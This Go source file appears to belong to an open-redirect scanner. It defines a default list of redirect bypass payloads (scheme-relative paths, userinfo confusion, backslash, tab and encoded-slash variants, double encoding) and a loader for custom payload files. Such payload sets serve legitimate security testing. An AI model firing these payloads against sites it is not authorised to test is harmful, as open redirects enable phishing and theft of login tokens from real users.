// Package payload manages the redirect mutation payload set.
//
// The built-in payloads cover common open-redirect bypass techniques:
// scheme-relative paths, userinfo confusion, backslash variants,
// tab/CRLF injection, dot-segment traversal, and double encoding.
// Custom payloads can be loaded from a file.
package payload

import (
	"bufio"
	"os"
	"strings"
)

// Default is the built-in redirect mutation payload set.
// It's a package-level variable (not a function) so callers share
// a single allocation instead of copying on every call.
var Default = []string{
	// Scheme-relative with path traversal
	`//example.com@google.com/%2f..`,
	`///google.com/%2f..`,
	`///example.com@google.com/%2f..`,
	`////google.com/%2f..`,

	// Full scheme with path traversal
	`https://google.com/%2f..`,
	`https://example.com@google.com/%2f..`,

	// Scheme-prefixed variants
	`/https://google.com/%2f..`,
	`/https://example.com@google.com/%2f..`,

	// Double-encoded path traversal
	`//google.com/%2f%2e%2e`,
	`//example.com@google.com/%2f%2e%2e`,
	`///google.com/%2f%2e%2e`,
	`///example.com@google.com/%2f%2e%2e`,
	`////google.com/%2f%2e%2e`,

	// Protocol manipulation
	`/http://example.com`,
	`/http:/example.com`,
	`/https:/%5cexample.com/`,
	// `/https://%09/example.com`,
	`/https://%5cexample.com`,
	`/https:///example.com/%2e%2e`,
	`/https:///example.com/%2f%2e%2e`,
	`/https://example.com`,
	`/https://example.com/`,
	`/https://example.com/%2e%2e`,
	`/https://example.com/%2e%2e%2f`,
	`/https://example.com/%2f%2e%2e`,
	`/https://example.com/%2f..`,
	`/https://example.com//`,
	`/https:example.com`,

	// Encoded slash variants
	`/%09/example.com`,
	`/%2f%2fexample.com`,
	// `/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/`,
	// `/%5cexample.com`,
	`/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d`,
	`/.example.com`,

	// Double-slash + encoded variants
	// `//%09/example.com`,
	// `//%5cexample.com`,
	// `///%09/example.com`,
	`///%5cexample.com`,
	// `////%09/example.com`,
	`////%5cexample.com`,

	// Deep path + special chars
	`/////example.com`,
	`/////example.com/`,
	`////\\;@example.com`,
	`////example.com/`,
}

// Load reads payloads from a file, one per line. Blank lines and lines
// starting with '#' are skipped, so users can comment their payload files.
func Load(path string) ([]string, error) {
	f, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	// Read-only handle: close failures cannot corrupt anything.
	defer func() { _ = f.Close() }()

	var out []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}
		out = append(out, line)
	}
	if err := sc.Err(); err != nil {
		return nil, err
	}
	return out, nil
}
